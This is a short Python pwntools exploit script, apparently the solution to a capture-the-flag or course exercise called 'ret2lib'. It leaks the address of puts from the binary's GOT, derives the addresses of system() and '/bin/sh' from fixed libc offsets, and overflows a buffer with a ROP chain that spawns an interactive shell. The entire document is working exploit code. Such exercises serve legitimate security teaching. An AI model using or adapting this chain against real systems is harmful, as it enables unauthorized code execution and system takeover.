from pwn import *
context.arch = 'amd64'

puts_got = '601018'

puts_off = 0x6f690
system_off = 0x45390
binsh_off = 0x18cd17
poprdi_addr = 0x00400823
ret_addr = 0x00400541

p = process('./03-ret2lib-8dae1f5fdb78457da8190155c8ea5643f5139991')

print p.recvuntil(':')
p.send(puts_got)
print p.recvuntil(':')

hex_puts_addr = p.readline().strip()
puts_addr = int(hex_puts_addr, 16)
print('puts_addr = ' + hex(puts_addr))
system_addr = puts_addr - puts_off + system_off
binsh_addr = puts_addr - puts_off + binsh_off

shellcode = 'a'*56 + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(ret_addr)
p.recvuntil('?')
p.sendline(shellcode)
p.recvline()
p.interactive()
